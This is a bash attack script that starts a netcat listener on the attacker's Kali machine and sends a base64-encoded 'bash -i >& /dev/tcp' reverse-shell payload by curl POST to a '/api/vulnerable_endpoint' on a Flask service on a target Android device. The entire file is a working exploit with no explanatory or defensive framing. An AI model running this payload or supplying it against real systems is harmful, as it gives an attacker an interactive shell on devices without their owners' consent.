#!/bin/bash

#targetIP
read -p "Enter target IP (Android): " TARGET_IP
read -p "Enter target PORT (Flask): " TARGET_PORT

#hostiP
KALI_IP=$(ip route get 1 | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -n1)

#listeningonport65535
REVERSE_PORT=65535

echo "[*] Detected Kali IP: $KALI_IP"
echo "[*] Selected reverse port: $REVERSE_PORT"

#startlistener
TERMINAL_CMD=""
if command -v gnome-terminal &>/dev/null; then
    TERMINAL_CMD="gnome-terminal -- bash -c \"echo '[*] Listening on $REVERSE_PORT'; nc -lvnp $REVERSE_PORT; exec bash\""
elif command -v xterm &>/dev/null; then
    TERMINAL_CMD="xterm -hold -e nc -lvnp $REVERSE_PORT &"
elif command -v konsole &>/dev/null; then
    TERMINAL_CMD="konsole --noclose -e nc -lvnp $REVERSE_PORT &"
else
    echo "[!] No supported terminal emulator found. Start listener manually: nc -lvnp $REVERSE_PORT"
fi

#spawnterminal
if [[ -n "$TERMINAL_CMD" ]]; then
    eval $TERMINAL_CMD
fi

#payload
ENCODED_PAYLOAD=$(echo -n "bash -i >& /dev/tcp/$KALI_IP/$REVERSE_PORT 0>&1" | base64)
JSON_PAYLOAD="{\"data\":\"$ENCODED_PAYLOAD\"}"

echo "[*] Sending reverse shell to $TARGET_IP:$TARGET_PORT"

#givepayload
RESPONSE=$(curl -s -X POST http://$TARGET_IP:$TARGET_PORT/api/vulnerable_endpoint \
    -H "Content-Type: application/json" \
    -d "$JSON_PAYLOAD")

echo "[*] Server response:"
echo "$RESPONSE"